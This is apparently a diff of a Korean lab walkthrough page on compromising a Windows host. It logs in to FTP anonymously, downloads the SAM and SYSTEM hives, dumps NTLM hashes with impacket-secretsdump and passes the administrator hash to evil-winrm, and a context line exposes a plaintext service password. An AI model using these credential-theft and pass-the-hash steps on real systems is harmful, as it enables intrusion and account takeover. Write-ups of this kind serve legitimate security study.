+</span></span><span style="display:flex;"><span>| Not valid before: 2026-07-01T13:51:31
+</span></span><span style="display:flex;"><span>|_Not valid after:  2026-12-31T13:51:31
+</span></span><span style="display:flex;"><span>5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 <span style="color:#f92672">(</span>SSDP/UPnP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-HTTPAPI/2.0
+</span></span><span style="display:flex;"><span>|_http-title: Not Found
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span></span></code></pre></div>
+<ul>
+<li>ftp에 anonymous 로그인</li>
+</ul>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>05-13-26  12:35PM       &lt;DIR&gt;          configs
+</span></span><span style="display:flex;"><span>05-13-26  12:35PM       &lt;DIR&gt;          logs
+</span></span><span style="display:flex;"><span>05-13-26  12:35PM                  <span style="color:#ae81ff">128</span> README.txt
+</span></span><span style="display:flex;"><span>06-04-26  02:10PM                <span style="color:#ae81ff">57344</span> SAM
+</span></span><span style="display:flex;"><span>05-13-26  12:35PM       &lt;DIR&gt;          scripts
+</span></span><span style="display:flex;"><span>06-04-26  02:10PM             <span style="color:#ae81ff">11448320</span> SYSTEM
+</span></span><span style="display:flex;"><span>06-04-26  02:10PM                   <span style="color:#ae81ff">75</span> web.config</span></span></code></pre></div>
+<ul>
+<li>
+<p>SAM, SYSTEM 파일 발견.</p>
+</li>
+<li>
+<p>binary 모드로 변경해야 다운로드 됨</p>
+</li>
+</ul>
+<p><a href="#R-image-5e66c71abcf62c7eb7b440e20b69dc3e" class="lightbox-link"><img alt="ftp" class="lazy lightbox figure-image" loading="lazy" src="/images/etc/standalone/ftp-binary.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-5e66c71abcf62c7eb7b440e20b69dc3e"><img alt="ftp" class="lazy lightbox lightbox-image" loading="lazy" src="/images/etc/standalone/ftp-binary.png"></a></p>
+<ul>
+<li>크레덴셜 덤프</li>
+</ul>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>impacket-secretsdump -sam SAM -system SYSTEM local
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:79aa62caf25987695bcc3be2c6c3119c:::
+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:86f427da8502647da948b444a62a380b:::
+</span></span><span style="display:flex;"><span>m.hayes:1004:aad3b435b51404eeaad3b435b51404ee:320a78179516c385e35a93ffa0b1c4ac:::
+</span></span><span style="display:flex;"><span>j.miller:1006:aad3b435b51404eeaad3b435b51404ee:cd1c6c69beaaf480f48d372acad449af:::
+</span></span><span style="display:flex;"><span>r.chase:1012:aad3b435b51404eeaad3b435b51404ee:7773c08920232397cae081704964b786:::</span></span></code></pre></div>
+<ul>
+<li>관리자로 접속하면 proof.txt까지 확인 가능</li>
+</ul>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>evil-winrm -i 192.168.96.111 -u administrator -H 79aa62caf25987695bcc3be2c6c3119c</span></span></code></pre></div>
 
   <footer class="footline">
               <i class='fa-fw fas fa-calendar'></i> Mar 10, 2026
@@ -527,8 +691,8 @@ svc_sql : SQLPoworiouse333</code></pre></div>
 <div id="R-footer" class="default-animation"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
       </div>
     </aside>
-    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1786181568" defer></script>
-    <script src="/js/theme.js?1786181568" defer></script>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1786870015" defer></script>
+    <script src="/js/theme.js?1786870015" defer></script>
     <div id="toast-container" role="status" aria-live="polite" aria-atomic="false"></div>
   </body>
 </html>
